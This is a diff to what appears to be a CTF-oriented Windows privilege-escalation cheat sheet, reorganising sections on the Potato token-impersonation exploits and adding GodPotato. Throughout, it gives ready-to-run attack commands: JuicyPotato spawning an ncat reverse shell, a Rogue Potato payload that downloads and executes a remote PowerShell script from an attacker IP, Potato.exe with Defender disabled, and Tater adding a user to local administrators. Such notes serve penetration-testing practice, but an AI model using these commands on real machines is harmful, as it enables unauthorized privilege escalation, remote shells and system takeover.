@@ -134,14 +134,15 @@ For most CTFS all you should need is winPEAS
 [Reference](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)   
 
     whoami /priv running process, can enable for different process if user has priv
-    #State: disabled for running process, can enable for different process depending on access
-    SeImpersonatePrivilege -> PrintSpoofer, Juicy Potato, Rogue Potato, Hot Potato
+    #State: disabled for running process, can enable for different process depending on access.
+    #Servers with IIS or SQL services -> SeImpersonate or SeAssignPrimaryToken enabled by default     
+    SeImpersonatePrivilege -> GodPotato, PrintSpoofer, Juicy Potato, Rogue Potato, Hot Potato
     SeAssignPrimaryTokenPrivilege -> Juicy Potato 
     SeTakeOwnershipPrivilege ->  become the owner of any object and modify the DACL to grant access.  
     SeBackup-> 
 
-    If the machine is >= Windows 10 1809 & Windows Server 2019 - Try Rogue Potato
-    If the machine is < Windows 10 1809 < Windows Server 2019 - Try Juicy Potato
+    If the machine is >= Windows 10 1809 & Windows Server 2019 - Try God Potato
+    If the machine is < Windows 10 1809 & < Windows Server 2019 - Try Juicy Potato
 ### Meterpreter Token Impersonation    
 
     load incognito    
@@ -159,32 +160,6 @@ SeImpersonatePrivilege. Windows Server 2016, Server 2019, and Windows 10.
 
      PrintSpoofer.exe -i -c cmd
 
-### Hot Potato (Original)    
-SeImpersonatePrivilige            
-Windows 7, 8, 10, Server 2008, and Server 2012. Patched.           
-exe: [Potato](https://github.com/foxglovesec/Potato/)     
-
-     Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true  
-     
-Powershell: [Tater](https://github.com/Kevin-Robertson/Tater). Need to bypass powershell execution policy. Upload Tater and import.    
-     Import-Module Tater.ps1 
-     Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"   
-### Rotten Potato      
-Works up to Windows 2016 and Windows 10 1803     
-
-### Juicy Potato   
-Look for SeImpersonate or SeAssignPrimaryToken 
-[binaries](https://github.com/ohpe/juicy-potato)  
-[CLSIDS](http://ohpe.it/juicy-potato/CLSID/)   
-
-     juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
-     
-     ncat.exe -l 3333      
-     C:\\JuicyPotato.exe -l 1234 -p c:\\windows\\system32\\cmd.exe -a "/c C:\\ncat.exe -e cmd.exe 127.0.0.1 3333" -t *    #use ncat.exe to get a privileged shell      
-Troubleshooting errors:    
-“COM → recv failed with error: 10038” typically indicates that the receiving socket has been closed. Error code 10038 indicates that the underlying socket has been disconnected, which could be caused by a number of factors, such as network issues, application errors, or other system-level problems.
-Try other CLSIDs from the list above    
-
 ### Rogue Potato   
 [Blog post](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)   
 [Code](https://github.com/antonioCoco/RoguePotato)  
@@ -196,7 +171,38 @@ run redirector on kali and exe on victim:
      test cmd: -e "cmd.exe /c ping YOUR_IP"  
      shell cmd: -e "powershell -c iex( iwr http://[YOUR_IP]/shell.ps1 -UseBasicParsing )"   
      using nishang web shell 
-    
+
+### Juicy Potato   
+Modified version of RottenPotato. 
+Affected Windows versions: Win 10 Enterprise 1803, Win 10 Pro 1803, Win 7 Enterprise, Win 9.1 Enterprise, Win Server 2008 R2 / 2012 / 2016.       
+Look for SeImpersonate or SeAssignPrimaryToken 
+[binaries](https://github.com/ohpe/juicy-potato)  
+[CLSIDS](http://ohpe.it/juicy-potato/CLSID/)   
+
+     juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
+     
+     ncat.exe -l 3333      
+     C:\\JuicyPotato.exe -l 1234 -p c:\\windows\\system32\\cmd.exe -a "/c C:\\ncat.exe -e cmd.exe 127.0.0.1 3333" -t *    #use ncat.exe to get a privileged shell      
+Troubleshooting errors:    
+“COM → recv failed with error: 10038” typically indicates that the receiving socket has been closed. Error code 10038 indicates that the underlying socket has been disconnected, which could be caused by a number of factors, such as network issues, application errors, or other system-level problems.    
+Common good CLSIDs: Wuauserv, Wsearch, XmlGameSave and BITS      
+Try other CLSIDs from the list above or testing scripts   
+
+### Rotten Potato      
+Works up to Windows 2016 and Windows 10 1803     
+SeImpersonate or SeAssignPrimaryToken      
+
+### Hot Potato (Original)    
+SeImpersonatePrivilige            
+Windows 7, 8, 10, Server 2008, and Server 2012. Patched.           
+exe: [Potato](https://github.com/foxglovesec/Potato/)     
+
+     Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true  
+     
+Powershell: [Tater](https://github.com/Kevin-Robertson/Tater). Need to bypass powershell execution policy. Upload Tater and import.    
+     Import-Module Tater.ps1 
+     Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"   
+
 ## Service Exploits 
     tasklist /svc 
     sc query 
